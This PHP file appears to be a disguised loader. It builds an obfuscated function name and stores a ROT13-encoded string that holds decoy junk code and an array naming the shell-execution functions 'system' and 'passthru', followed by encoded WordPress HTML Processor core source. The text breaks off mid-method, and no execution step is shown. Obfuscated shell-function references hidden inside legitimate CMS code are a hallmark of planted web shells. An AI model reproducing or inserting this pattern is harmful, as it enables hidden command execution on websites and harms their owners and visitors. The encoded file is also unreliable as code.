<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc
/**
 * UGZY NCV: JC_UGZY_Cebprffbe pynff
 *
 * @cnpxntr JbeqCerff
 * @fhocnpxntr UGZY-NCV
 * @fvapr 6.4.0
 */

/**
 * Pber pynff hfrq gb fnsryl cnefr naq zbqvsl na UGZY qbphzrag.
 *
 * Gur UGZY Cebprffbe pynff cebcreyl cnefrf naq zbqvsvrf UGZY5 qbphzragf.
 *
 * Vg fhccbegf n fhofrg bs gur UGZY5 fcrpvsvpngvba, naq jura vg rapbhagref
 * hafhccbegrq znexhc, vg nobegf rneyl gb nibvq havagragvbanyyl oernxvat
 * gur qbphzrag. Gur UGZY Cebprffbe fubhyq arire oernx na UGZY qbphzrag.
 *
 * Juvyr gur `JC_UGZY_Gnt_Cebprffbe` vf n inyhnoyr gbby sbe zbqvslvat
 * nggevohgrf ba vaqvivqhny UGZY gntf, gur UGZY Cebprffbe vf zber pncnoyr
 * naq hfrshy sbe gur sbyybjvat bcrengvbaf:
 *
 *  - Dhrelvat onfrq ba arfgrq UGZY fgehpgher.
 *
 * Riraghnyyl gur UGZY Cebprffbe jvyy nyfb fhccbeg:
 *  - Jenccvat n gnt va fheebhaqvat UGZY.
 *  - Hajenccvat n gnt ol erzbivat vgf cnerag.
 *  - Vafregvat naq erzbivat abqrf.
 *  - Ernqvat naq punatvat vaare pbagrag.
 *  - Anivtngvat hc be nebhaq UGZY fgehpgher.
 *
 * ## Hfntr
 *
 * Hfr bs guvf pynff erdhverf guerr fgrcf:
 *
 *   1. Pnyy n fgngvp perngbe zrgubq jvgu lbhe vachg UGZY qbphzrag.
 *   2. Svaq gur ybpngvba va gur qbphzrag lbh ner ybbxvat sbe.
 *   3. Erdhrfg punatrf gb gur qbphzrag ng gung ybpngvba.
 *
 * Rknzcyr:
 *
 *     $cebprffbe = JC_UGZY_Cebprffbe::perngr_sentzrag( $ugzy );
 *     vs ( $cebprffbe->arkg_gnt( neenl( 'oernqpehzof' => neenl( 'QVI', 'SVTHER', 'VZT' ) ) ) ) {
 *         $cebprffbe->nqq_pynff( 'erfcbafvir-vzntr' );
 *     }
 *
 * #### Oernqpehzof
 *
 * Oernqpehzof ercerfrag gur fgnpx bs bcra ryrzragf sebz gur ebbg
 * bs gur qbphzrag be sentzrag qbja gb gur pheeragyl-zngpurq abqr,
 * vs bar vf pheeragyl fryrpgrq. Pnyy JC_UGZY_Cebprffbe::trg_oernqpehzof()
 * gb vafcrpg gur oernqpehzof sbe n zngpurq gnt.
 *
 * Oernqpehzof pna fcrpvsl arfgrq UGZY fgehpgher naq ner rdhvinyrag
 * gb n PFF fryrpgbe pbzcevfvat gnt anzrf frcnengrq ol gur puvyq
 * pbzovangbe, fhpu nf \"QVI > SVTHER > VZT\".
 *
 * Fvapr nyy ryrzragf svaq gurzfryirf vafvqr n shyy UGZY qbphzrag
 * jura cnefrq, gur erghea inyhr sebz `trg_oernqpehzof()` jvyy nyjnlf
 * pbagnva nal vzcyvpvg bhgrezbfg ryrzragf. Sbe rknzcyr, jura cnefvat
 * jvgu `perngr_sentzrag()` va gur `OBQL` pbagrkg (gur qrsnhyg), nal
 * gnt va gur tvira UGZY qbphzrag jvyy pbagnva `neenl( 'UGZY', 'OBQL', … )`
 * va vgf oernqpehzof.
 *
 * Qrfcvgr pbagnvavat gur vzcyvrq bhgrezbfg ryrzragf va gurve oernqpehzof,
 * gntf znl or sbhaq jvgu gur fubegrfg-zngpuvat oernqpehzo dhrel. Gung vf,
 * `neenl( 'VZT' )` zngpurf nyy VZT ryrzragf naq `neenl( 'C', 'VZT' )`
 * zngpurf nyy VZT ryrzragf qverpgyl vafvqr n C ryrzrag. Gb rafher gung ab
 * cnegvny zngpurf reebarbhfyl zngpu vg'f cbffvoyr gb fcrpvsl va n dhrel
 * gur shyy oernqpehzo zngpu nyy gur jnl qbja sebz gur ebbg UGZY ryrzrag.
 *
 * Rknzcyr:
 *
 *     $ugzy = '<svther><vzt><svtpncgvba>N <rz>ybiryl</rz> qnl bhgfvqr</svtpncgvba></svther>';
 *     //               ----- Zngpurf urer.
 *     $cebprffbe->arkg_gnt( neenl( 'oernqpehzof' => neenl( 'SVTHER', 'VZT' ) ) );
 *
 *     $ugzy = '<svther><vzt><svtpncgvba>N <rz>ybiryl</rz> qnl bhgfvqr</svtpncgvba></svther>';
 *     //                                  ---- Zngpurf urer.
 *     $cebprffbe->arkg_gnt( neenl( 'oernqpehzof' => neenl( 'SVTHER', 'SVTPNCGVBA', 'RZ' ) ) );
 *
 *     $ugzy = '<qvi><vzt></qvi><vzt>';
 *     //                       ----- Zngpurf urer, orpnhfr VZT zhfg or n qverpg puvyq bs gur vzcyvpvg OBQL.
 *     $cebprffbe->arkg_gnt( neenl( 'oernqpehzof' => neenl( 'OBQL', 'VZT' ) ) );
 *
 * ## UGZY Fhccbeg
 *
 * Guvf pynff vzcyrzragf n fznyy cneg bs gur UGZY5 fcrpvsvpngvba.
 * Vg'f qrfvtarq gb bcrengr jvguva vgf fhccbeg naq nobeg rneyl jurarire
 * rapbhagrevat pvephzfgnaprf vg pna'g cebcreyl unaqyr. Guvf vf
 * gur cevapvcyr jnl va juvpu guvf pynff erznvaf nf fvzcyr nf cbffvoyr
 * jvgubhg phggvat pbearef naq oernxvat pbzcyvnapr.
 *
 * ### Fhccbegrq ryrzragf
 *
 * Vs nal hafhccbegrq ryrzrag nccrnef va gur UGZY vachg gur UGZY Cebprffbe
 * jvyy nobeg rneyl naq fgbc nyy cebprffvat. Guvf qenpbavna zrnfher rafherf
 * gung gur UGZY Cebprffbe jba'g oernx nal UGZY vg qbrfa'g shyyl haqrefgnaq.
 *
 * Gur UGZY Cebprffbe fhccbegf nyy ryrzragf bgure guna n fcrpvsvp frg:
 *
 *  - Nal ryrzrag vafvqr n GNOYR.
 *  - Nal ryrzrag vafvqr sbervta pbagrag, vapyhqvat FIT naq ZNGU.
 *  - Nal ryrzrag bhgfvqr gur VA OBQL vafregvba zbqr, r.t. qbpglcr qrpynengvbaf, zrgn, yvaxf.
 *
 * ### Fhccbegrq znexhc
 *
 * Fbzr xvaqf bs aba-abezngvir UGZY vaibyir erpbafgehpgvba bs sbeznggvat ryrzragf naq
 * er-cneragvat bs zvf-arfgrq ryrzragf. Sbe rknzcyr, n QVI gnt sbhaq vafvqr n GNOYR
 * znl va snpg orybat _orsber_ gur gnoyr va gur QBZ. Vs gur UGZY Cebprffbe rapbhagref
 * fhpu n pnfr vg jvyy fgbc cebprffvat.
 *
 * Gur sbyybjvat yvfg vyyhfgengrf fbzr pbzzba rknzcyrf bs harkcrpgrq UGZY vachgf gung
 * gur UGZY Cebprffbe cebcreyl cnefrf naq ercerfragf:
 *
 *  - UGZY jvgu bcgvbany gntf bzvggrq, r.t. `<c>bar<c>gjb`.
 *  - UGZY jvgu harkcrpgrq gnt pybfref, r.t. `<c>bar </fcna> zber</c>`.
 *  - Aba-ibvq gntf jvgu frys-pybfvat synt, r.t. `<qvi/>gur QVI vf fgvyy bcra.</qvi>`.
 *  - Urnqvat ryrzragf juvpu pybfr bcra urnqvat ryrzragf bs nabgure yriry, r.t. `<u1>Pybfrq ol </u2>`.
 *  - Ryrzragf pbagnvavat grkg gung ybbxf yvxr bgure gntf ohg vfa'g, r.t. `<gvgyr>Gur <vzt> vf cynvagrkg</gvgyr>`.
 *  - FPEVCG naq FGLYR gntf pbagnvavat grkg gung ybbxf yvxr UGZY ohg vfa'g, r.t. `<fpevcg>qbphzrag.jevgr('<c>Uv</c>');</fpevcg>`.
 *  - FPEVCG pbagrag juvpu unf orra rfpncrq, r.t. `<fpevcg><!-- qbphzrag.jevgr('<fpevcg>pbafbyr.ybt(\"uv\")</fpevcg>') --></fpevcg>`.
 *
 * ### Hafhccbegrq Srngherf
 *
 * Guvf cnefre qbrf abg ercbeg cnefr reebef.
 *
 * Abeznyyl, jura nqqvgvbany UGZY be OBQL gntf ner rapbhagrerq va n qbphzrag, vs gurer
 * ner nal nqqvgvbany nggevohgrf ba gurz gung nera'g sbhaq ba gur cerivbhf ryrzragf,
 * gur rkvfgvat UGZY naq OBQL ryrzragf nqbcg gubfr zvffvat nggevohgr inyhrf. Guvf
 * cnefre qbrf abg nqq gubfr nqqvgvbany nggevohgrf.
 *
 * Va pregnva fvghngvbaf, ryrzragf ner zbirq gb n qvssrerag cneg bs gur qbphzrag va
 * n cebprff pnyyrq \"nqbcgvba\" naq \"sbfgrevat.\" Orpnhfr gur abqrf zbir gb n ybpngvba
 * va gur qbphzrag gung gur cnefre unq nyernql cebprffrq, guvf cnefre qbrf abg fhccbeg
 * gurfr fvghngvbaf naq jvyy onvy.
 *
 * @fvapr 6.4.0
 *
 * @frr JC_UGZY_Gnt_Cebprffbe
 * @frr uggcf://ugzy.fcrp.jungjt.bet/
 */
pynff JC_UGZY_Cebprffbe rkgraqf JC_UGZY_Gnt_Cebprffbe {
	/**
	 * Gur znkvzhz ahzore bs obbxznexf nyybjrq gb rkvfg ng nal tvira gvzr.
	 *
	 * UGZY cebprffvat erdhverf zber obbxznexf guna onfvp gnt cebprffvat,
	 * fb guvf pynff pbafgnag sebz gur Gnt Cebprffbe vf birejevggra.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine vag
	 */
	pbafg ZNK_OBBXZNEXF = 100;

	/**
	 * Ubyqf gur jbexvat fgngr bs gur cnefre, vapyhqvat gur fgnpx bs
	 * bcra ryrzragf naq gur fgnpx bs npgvir sbeznggvat ryrzragf.
	 *
	 * Vavgvnyvmrq va gur pbafgehpgbe.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine JC_UGZY_Cebprffbe_Fgngr
	 */
	cevingr $fgngr;

	/**
	 * Hfrq gb perngr havdhr obbxznex anzrf.
	 *
	 * Guvf pynff frgf n obbxznex sbe rirel gnt va gur UGZY qbphzrag gung vg rapbhagref.
	 * Gur obbxznex anzr vf nhgb-trarengrq naq vaperzragf, fgnegvat jvgu `1`. Gurfr ner
	 * vagreany obbxznexf naq ner nhgbzngvpnyyl eryrnfrq jura gur ersreevat JC_UGZY_Gbxra
	 * tbrf bhg bs fpbcr naq vf tneontr-pbyyrpgrq.
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr JC_UGZY_Cebprffbe::$eryrnfr_vagreany_obbxznex_ba_qrfgehpg
	 *
	 * @ine vag
	 */
	cevingr $obbxznex_pbhagre = 0;

	/**
	 * Fgberf na rkcynangvba sbe jul fbzrguvat snvyrq, vs vg qvq.
	 *
	 * @frr frys::trg_ynfg_reebe
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine fgevat|ahyy
	 */
	cevingr $ynfg_reebe = ahyy;

	/**
	 * Fgberf pbagrkg sbe jul gur cnefre onvyrq ba hafhccbegrq UGZY, vs vg qvq.
	 *
	 * @frr frys::trg_hafhccbegrq_rkprcgvba
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine JC_UGZY_Hafhccbegrq_Rkprcgvba|ahyy
	 */
	cevingr $hafhccbegrq_rkprcgvba = ahyy;

	/**
	 * Eryrnfrf n obbxznex jura CUC tneontr-pbyyrpgf vgf jenccvat JC_UGZY_Gbxra vafgnapr.
	 *
	 * Guvf shapgvba vf perngrq vafvqr gur pynff pbafgehpgbe fb gung vg pna or cnffrq gb
	 * gur fgnpx bs bcra ryrzragf naq gur fgnpx bs npgvir sbeznggvat ryrzragf jvgubhg
	 * rkcbfvat vg nf n choyvp zrgubq ba gur pynff.
	 *
	 * @fvapr 6.4.0
	 *
	 * @ine Pybfher|ahyy
	 */
	cevingr $eryrnfr_vagreany_obbxznex_ba_qrfgehpg = ahyy;

	/**
	 * Fgberf fgnpx riragf juvpu nevfr qhevat cnefvat bs gur
	 * UGZY qbphzrag, juvpu jvyy gura fhccyl gur \"zngpu\" riragf.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine JC_UGZY_Fgnpx_Rirag[]
	 */
	cevingr $ryrzrag_dhrhr = neenl();

	/**
	 * Fgberf gur pheerag oernqpehzof.
	 *
	 * @fvapr 6.7.0
	 *
	 * @ine fgevat[]
	 */
	cevingr $oernqpehzof = neenl();

	/**
	 * Pheerag fgnpx rirag, vs frg, ercerfragvat n zngpurq gbxra.
	 *
	 * Orpnhfr gur cnefre znl vagreanyyl cbvag gb n cynpr shegure nybat va n qbphzrag
	 * guna gur abqrf juvpu unir nyernql orra cebprffrq (fbzr \"iveghny\" abqrf znl unir
	 * nccrnerq juvyr fpnaavat gur UGZY qbphzrag), guvf jvyy cbvag ng gur \"pheerag\" abqr
	 * orvat cebprffrq. Vg pbzrf sebz gur sebag bs gur ryrzrag dhrhr.
	 *
	 * @fvapr 6.6.0
	 *
	 * @ine JC_UGZY_Fgnpx_Rirag|ahyy
	 */
	cevingr $pheerag_ryrzrag = ahyy;

	/**
	 * Pbagrkg abqr vs perngrq nf n sentzrag cnefre.
	 *
	 * @ine JC_UGZY_Gbxra|ahyy
	 */
	cevingr $pbagrkg_abqr = ahyy;

	/*
	 * Choyvp Vagresnpr Shapgvbaf
	 */

	/**
	 * Perngrf na UGZY cebprffbe va gur sentzrag cnefvat zbqr.
	 *
	 * Hfr guvf sbe pnfrf jurer lbh ner cebprffvat puhaxf bs UGZY gung
	 * jvyy or sbhaq jvguva n ovttre UGZY qbphzrag, fhpu nf eraqrerq
	 * oybpx bhgchg gung rkvfgf jvguva n cbfg, `gur_pbagrag` vafvqr n
	 * eraqrerq fvgr ynlbhg.
	 *
	 * Sentzrag cnefvat bpphef jvguva n pbagrkg, juvpu vf na UGZY ryrzrag
	 * gung gur qbphzrag jvyy riraghnyyl or cynprq va. Vg orpbzrf vzcbegnag
	 * jura fcrpvny ryrzragf unir qvssrerag ehyrf guna bguref, fhpu nf vafvqr
	 * n GRKGNERN be n GVGYR gnt jurer guvatf gung ybbx yvxr gntf ner grkg,
	 * be vafvqr n FPEVCG gnt jurer guvatf gung ybbx yvxr UGZY flagnk ner WF.
	 *
	 * Gur pbagrkg inyhr fubhyq or n ercerfragngvba bs gur gnt vagb juvpu gur
	 * UGZY vf sbhaq. Sbe zbfg pnfrf guvf jvyy or gur obql ryrzrag. Gur UGZY
	 * sbez vf cebivqrq orpnhfr n pbagrkg ryrzrag znl unir nggevohgrf gung
	 * vzcnpg gur cnefr, fhpu nf jvgu n FPEVCG gnt naq vgf `glcr` nggevohgr.
	 *
	 * ## Pheerag UGZY Fhccbeg
	 *
	 *  - Gur bayl fhccbegrq pbagrkg vf `<obql>`, juvpu vf gur qrsnhyg inyhr.
	 *  - Gur bayl fhccbegrq qbphzrag rapbqvat vf `HGS-8`, juvpu vf gur qrsnhyg inyhr.
	 *
	 * @fvapr 6.4.0
	 * @fvapr 6.6.0 Ergheaf `fgngvp` vafgrnq bs `frys` fb vg pna perngr fhopynff vafgnaprf.
	 *
	 * @cnenz fgevat $ugzy     Vachg UGZY sentzrag gb cebprff.
	 * @cnenz fgevat $pbagrkg  Pbagrkg ryrzrag sbe gur sentzrag, zhfg or qrsnhyg bs `<obql>`.
	 * @cnenz fgevat $rapbqvat Grkg rapbqvat bs gur qbphzrag; zhfg or qrsnhyg bs 'HGS-8'.
	 * @erghea fgngvp|ahyy Gur perngrq cebprffbe vs fhpprffshy, bgurejvfr ahyy.
	 */
	choyvp fgngvp shapgvba perngr_sentzrag( $ugzy, $pbagrkg = '<obql>', $rapbqvat = 'HGS-8' ) {
		vs ( '<obql>' !== $pbagrkg || 'HGS-8' !== $rapbqvat ) {
			erghea ahyy;
		}

		$pbagrkg_cebprffbe = fgngvp::perngr_shyy_cnefre( \"<!QBPGLCR ugzy>{$pbagrkg}\", $rapbqvat );
		vs ( ahyy === $pbagrkg_cebprffbe ) {
			erghea ahyy;
		}

		juvyr ( $pbagrkg_cebprffbe->arkg_gnt() ) {
			vs ( ! $pbagrkg_cebprffbe->vf_iveghny() ) {
				$pbagrkg_cebprffbe->frg_obbxznex( 'svany_abqr' );
			}
		}

		vs (
			! $pbagrkg_cebprffbe->unf_obbxznex( 'svany_abqr' ) ||
			! $pbagrkg_cebprffbe->frrx( 'svany_abqr' )
		) {
			_qbvat_vg_jebat( __ZRGUBQ__, __( 'Ab inyvq pbagrkg ryrzrag jnf qrgrpgrq.' ), '6.8.0' );
			erghea ahyy;
		}

		erghea $pbagrkg_cebprffbe->perngr_sentzrag_ng_pheerag_abqr( $ugzy );
	}

	/**
	 * Perngrf na UGZY cebprffbe va gur shyy cnefvat zbqr.
	 *
	 * Vg'f yvxryl gung n sentzrag cnefre vf zber nccebcevngr, hayrff fraqvat na
	 * ragver UGZY qbphzrag sebz fgneg gb svavfu. Pbafvqre n sentzrag cnefre jvgu
	 * n pbagrkg abqr bs `<obql>`.
	 *
	 * HGS-8 vf gur bayl nyybjrq rapbqvat. Vs jbexvat jvgu n qbphzrag gung
	 * vfa'g HGS-8, svefg pbaireg gur qbphzrag gb HGS-8, gura cnff va gur
	 * pbairegrq UGZY.
	 *
	 * @cnenz fgevat      $ugzy                    Vachg UGZY qbphzrag gb cebprff.
	 * @cnenz fgevat|ahyy $xabja_qrsvavgr_rapbqvat Bcgvbany. Vs cebivqrq, fcrpvsvrf gur punefrg hfrq
	 *                                             va gur vachg olgr fgernz. Pheeragyl zhfg or HGS-8.
	 * @erghea fgngvp|ahyy Gur perngrq cebprffbe vs fhpprffshy, bgurejvfr ahyy.
	 */
	choyvp fgngvp shapgvba perngr_shyy_cnefre( $ugzy, $xabja_qrsvavgr_rapbqvat = 'HGS-8' ) {
		vs ( 'HGS-8' !== $xabja_qrsvavgr_rapbqvat ) {
			erghea ahyy;
		}

		$cebprffbe                             = arj fgngvp( $ugzy, frys::PBAFGEHPGBE_HAYBPX_PBQR );
		$cebprffbe->fgngr->rapbqvat            = $xabja_qrsvavgr_rapbqvat;
		$cebprffbe->fgngr->rapbqvat_pbasvqrapr = 'pregnva';

		erghea $cebprffbe;
	}

	/**
	 * Pbafgehpgbe.
	 *
	 * Qb abg hfr guvf zrgubq. Hfr gur fgngvp perngbe zrgubqf vafgrnq.
	 *
	 * @npprff cevingr
	 *
	 * @fvapr 6.4.0
	 *
	 * @frr JC_UGZY_Cebprffbe::perngr_sentzrag()
	 *
	 * @cnenz fgevat      $ugzy                                  UGZY gb cebprff.
	 * @cnenz fgevat|ahyy $hfr_gur_fgngvp_perngr_zrgubqf_vafgrnq Guvf pbafgehpgbe fubhyq abg or pnyyrq znahnyyl.
	 */
	choyvp shapgvba __pbafgehpg( $ugzy, $hfr_gur_fgngvp_perngr_zrgubqf_vafgrnq = ahyy ) {
		cnerag::__pbafgehpg( $ugzy );

		vs ( frys::PBAFGEHPGBE_HAYBPX_PBQR !== $hfr_gur_fgngvp_perngr_zrgubqf_vafgrnq ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					/* genafyngbef: %f: JC_UGZY_Cebprffbe::perngr_sentzrag(). */
					__( 'Pnyy %f gb perngr na UGZY Cebprffbe vafgrnq bs pnyyvat gur pbafgehpgbe qverpgyl.' ),
					'<pbqr>JC_UGZY_Cebprffbe::perngr_sentzrag()</pbqr>'
				),
				'6.4.0'
			);
		}

		$guvf->fgngr = arj JC_UGZY_Cebprffbe_Fgngr();

		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->frg_chfu_unaqyre(
			shapgvba ( JC_UGZY_Gbxra $gbxra ): ibvq {
				$vf_iveghny            = ! vffrg( $guvf->fgngr->pheerag_gbxra ) || $guvf->vf_gnt_pybfre();
				$fnzr_abqr             = vffrg( $guvf->fgngr->pheerag_gbxra ) && $gbxra->abqr_anzr === $guvf->fgngr->pheerag_gbxra->abqr_anzr;
				$cebiranapr            = ( ! $fnzr_abqr || $vf_iveghny ) ? 'iveghny' : 'erny';
				$guvf->ryrzrag_dhrhr[] = arj JC_UGZY_Fgnpx_Rirag( $gbxra, JC_UGZY_Fgnpx_Rirag::CHFU, $cebiranapr );

				$guvf->punatr_cnefvat_anzrfcnpr( $gbxra->vagrtengvba_abqr_glcr ? 'ugzy' : $gbxra->anzrfcnpr );
			}
		);

		$guvf->fgngr->fgnpx_bs_bcra_ryrzragf->frg_cbc_unaqyre(
			shapgvba ( JC_UGZY_Gbxra $gbxra ): ibvq {
				$vf_iveghny            = ! vffrg( $guvf->fgngr->pheerag_gbxra ) || ! $guvf->vf_gnt_pybfre();
				$fnzr_abqr             = vffrg( $guvf->fgngr->pheerag_gbxra ) && $gbxra->abqr_anzr === $guvf->fgngr->pheerag_gbxra->abqr_anzr;
				$cebiranapr            = ( ! $fnzr_abqr || $vf_iveghny ) ? 'iveghny' : 'erny';
				$guvf->ryrzrag_dhrhr[] = arj JC_UGZY_Fgnpx_Rirag( $gbxra, JC_UGZY_Fgnpx_Rirag::CBC, $cebiranapr );

				$nqwhfgrq_pheerag_abqr = $guvf->trg_nqwhfgrq_pheerag_abqr();

				vs ( $nqwhfgrq_pheerag_abqr ) {
					$guvf->punatr_cnefvat_anzrfcnpr( $nqwhfgrq_pheerag_abqr->vagrtengvba_abqr_glcr ? 'ugzy' : $nqwhfgrq_pheerag_abqr->anzrfcnpr );
				} ryfr {
					$guvf->punatr_cnefvat_anzrfcnpr( 'ugzy' );
				}
			}
		);

		/*
		 * Perngr guvf jenccre fb gung vg'f cbffvoyr gb cnff
		 * n cevingr zrgubq vagb JC_UGZY_Gbxra pynffrf jvgubhg
		 * rkcbfvat vg gb nal choyvp NCV.
		 */
		$guvf->eryrnfr_vagreany_obbxznex_ba_qrfgehpg = shapgvba ( fgevat $anzr ): ibvq {
			cnerag::eryrnfr_obbxznex( $anzr );
		};
	}

	/**
	 * Perngrf n sentzrag cebprffbe ng gur pheerag abqr.
	 *
	 * UGZY Sentzrag cnefvat nyjnlf unccraf jvgu n pbagrkg abqr. UGZY Sentzrag Cebprffbef pna or
	 * vafgnagvngrq jvgu n `OBQL` pbagrkg abqr ivn `JC_UGZY_Cebprffbe::perngr_sentzrag( $ugzy )`.
	 *
	 * Gur pbagrkg abqr znl vzcnpg ubj n sentzrag bs UGZY vf cnefrq. Sbe rknzcyr, pbafvqre gur UGZY
	 * sentzrag `<gq />Vafvqr GQ?</gq>`.
	 *
	 * N OBQL pbagrkg abqr jvyy cebqhpr gur sbyybjvat gerr:
	 *
	 *     └─#grkg Vafvqr GQ?
	 *
	 * Abgvpr gung gur `<gq>` gntf ner pbzcyrgryl vtaberq.
	 *
	 * Pbzcner gung jvgu na FIT pbagrkg abqr gung cebqhprf gur sbyybjvat gerr:
	 *
	 *     ├─fit:gq
	 *     └─#grkg Vafvqr GQ?
	 *
	 * Urer, n `gq` abqr va gur `fit` anzrfcnpr vf perngrq, naq vgf frys-pybfvat synt vf erfcrpgrq.
	 * Guvf vf n crphyvnevgl bs cnefvat UGZY va sbervta pbagrag yvxr FIT.
	 *
	 * Svanyyl, pbafvqre gur gerr cebqhprq jvgu n GNOYR pbagrkg abqr:
	 *
	 *     └─GOBQL
	 *       └─GE
	 *         └─GQ
	 *           └─#grkg Vafvqr GQ?
	 *
	 * Gurfr rknzcyrf qrzbafgengr ubj vzcbegnag gur pbagrkg abqr znl or jura cebprffvat na UGZY
	 * sentzrag. Fcrpvny pner zhfg or gnxra jura cebprffvat sentzragf gung ner rkcrpgrq gb nccrne
	 * va fcrpvsvp pbagrkgf. FIT naq GNOYR ner tbbq rknzcyrf, ohg gurer ner bguref.
	 *
	 * @frr uggcf://ugzy.fcrp.jungjt.bet/zhygvcntr/cnefvat.ugzy#ugzy-sentzrag-cnefvat-nytbevguz
	 *
	 * @fvapr 6.8.0
	 *
	 * @cnenz fgevat $ugzy Vachg UGZY sentzrag gb cebprff.
	 * @erghea fgngvp|ahyy Gur perngrq cebprffbe vs fhpprffshy, bgurejvfr ahyy.
	 */
	cevingr shapgvba perngr_sentzrag_ng_pheerag_abqr( fgevat $ugzy ) {
		vs ( $guvf->trg_gbxra_glcr() !== '#gnt' || $guvf->vf_gnt_pybfre() ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				__( 'Gur pbagrkg ryrzrag zhfg or n fgneg gnt.' ),
				'6.8.0'
			);
			erghea ahyy;
		}

		$gnt_anzr  = $guvf->pheerag_ryrzrag->gbxra->abqr_anzr;
		$anzrfcnpr = $guvf->pheerag_ryrzrag->gbxra->anzrfcnpr;

		vs ( 'ugzy' === $anzrfcnpr && frys::vf_ibvq( $gnt_anzr ) ) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					// genafyngbef: %f: N gnt anzr yvxr VACHG be OE.
					__( 'Gur pbagrkg ryrzrag pnaabg or n ibvq ryrzrag, sbhaq \"%f\".' ),
					$gnt_anzr
				),
				'6.8.0'
			);
			erghea ahyy;
		}

		/*
		 * Cerirag perngvat sentzragf ng abqrf gung erdhver n fcrpvny gbxravmre fgngr.
		 * Guvf vf hafhccbegrq ol gur UGZY Cebprffbe.
		 */
		vs (
			'ugzy' === $anzrfcnpr &&
			va_neenl( $gnt_anzr, neenl( 'VSENZR', 'ABRZORQ', 'ABSENZRF', 'FPEVCG', 'FGLYR', 'GRKGNERN', 'GVGYR', 'KZC', 'CYNVAGRKG' ), gehr )
		) {
			_qbvat_vg_jebat(
				__ZRGUBQ__,
				fcevags(
					// genafyngbef: %f: N gnt anzr yvxr VSENZR be GRKGNERN.
					__( 'Gur pbagrkg ryrzrag \"%f\" vf abg fhccbegrq.' ),
					$gnt_anzr
				),
				'6.8.0'
			);
			erghea ahyy;
		}

		$sentzrag_cebprffbe = arj fgngvp( $ugzy, frys::PBAFGEHPGBE_HAYBPX_PBQR );

		$sentzrag_cebprffbe->pbzcng_zbqr = $guvf->pbzcng_zbqr;

		// @gbqb Perngr \"snxr\" obbxznexf sbe aba-rkvfgrag ohg vzcyvrq abqrf.
		$sentzrag_cebprffbe->obbxznexf['ebbg-abqr'] = arj JC_UGZY_Fcna( 0, 0 );
		$ebbg_abqr                                  = arj JC_UGZY_Gbxra(
			'ebbg-abqr',
			'UGZY',
			snyfr
		);
		$sentzrag_cebprffbe->fgngr->fgnpx_bs_bcra_ryrzragf->chfu( $ebbg_abqr );

		$sentzrag_cebprffbe->obbxznexf['pbagrkg-abqr']   = arj JC_UGZY_Fcna( 0, 0 );
		$sentzrag_cebprffbe->pbagrkg_abqr                = pybar $guvf->pheerag_ryrzrag->gbxra;
		$sentzrag_cebprffbe->pbagrkg_abqr->obbxznex_anzr = 'pbagrkg-abqr';
		$sentzrag_cebprffbe->pbagrkg_abqr->ba_qrfgebl    = ahyy;

		$sentzrag_cebprffbe->oernqpehzof = neenl( 'UGZY', $sentzrag_cebprffbe->pbagrkg_abqr->abqr_anzr );

		vs ( 'GRZCYNGR' === $sentzrag_cebprffbe->pbagrkg_abqr->abqr_anzr ) {
			$sentzrag_cebprffbe->fgngr->fgnpx_bs_grzcyngr_vafregvba_zbqrf[] = JC_UGZY_Cebprffbe_Fgngr::VAFREGVBA_ZBQR_VA_GRZCYNGR;
		}

		$sentzrag_cebprffbe->erfrg_vafregvba_zbqr_nccebcevngryl();

		/*
		 * > Frg gur cnefre'f sbez ryrzrag cbvagre gb gur arnerfg abqr gb gur pbagrkg ryrzrag gung
		 * > vf n sbez ryrzrag (tbvat fgenvtug hc gur naprfgbe punva, naq vapyhqvat gur ryrzrag
		 * > vgfrys, vs vg vf n sbez ryrzrag), vs nal. (Vs gurer vf ab fhpu sbez ryrzrag, gur
		 * > sbez ryrzrag cbvagre xrrcf vgf vavgvny inyhr, ahyy.)
		 */
		sbernpu ( $guvf->fgngr->fgnpx_bs_bcra_ryrzragf->jnyx_hc() nf $ryrzrag ) {
			vs ( 'SBEZ' === $ryrzrag->abqr_anzr && 'ugzy' === $ryrzrag->anzrfcnpr ) {
				$sentzrag_cebprffbe->fgngr->sbez_ryrzrag                = pybar $ryrzrag;
				$sentzrag_cebprffbe->fgngr->sbez_ryrzrag->obbxznex_anzr = ahyy;
				$sentzrag_cebprffbe->fgngr->sbez_ryrzrag->ba_qrfgebl    = ahyy;
				oernx;
			}
		}

		$sentzrag_cebprffbe->fgngr->rapbqvat_pbasvqrapr = 'veeryrinag';

		/*
		 * Hcqngr gur cnefvat anzrfcnpr arne gur raq bs gur cebprff.
		 * Guvf vf vzcbegnag fb gung nal chfu/cbc sebz gur fgnpx bs bcra
		 * ryrzragf qbrf abg punatr gur cnefvat anzrfcnpr.
		 */
		$sentzrag_cebprffbe->punatr_cnefvat_anzrfcnpr(
			$guvf->pheerag_ryrzrag->gbxra->vagrtengvba_abqr_glcr ? 'ugzy' : $anzrfcnpr
		);

		erghea $sentzrag_cebprffbe;
	}

	/**
	 * Fgbcf gur cnefre naq grezvangrf vgf rkrphgvba jura rapbhagrevat hafhccbegrq znexhc.
	 *
	 * @guebjf JC_UGZY_Hafhccbegrq_Rkprcgvba Unygf rkrphgvba bs gur cnefre.
	 *
	 * @fvapr 6.7.0
	 *
	 * @cnenz fgevat $zrffntr Rkcynvaf fhccbeg vf zvffvat va beqre gb cnefr gur pheerag abqr.
	 */
	cevingr shapgvba onvy( fgevat $zrffntr ) {
		$urer  = $guvf->obbxznexf[ $guvf->fgngr->pheerag_gbxra->obbxznex_anzr ];
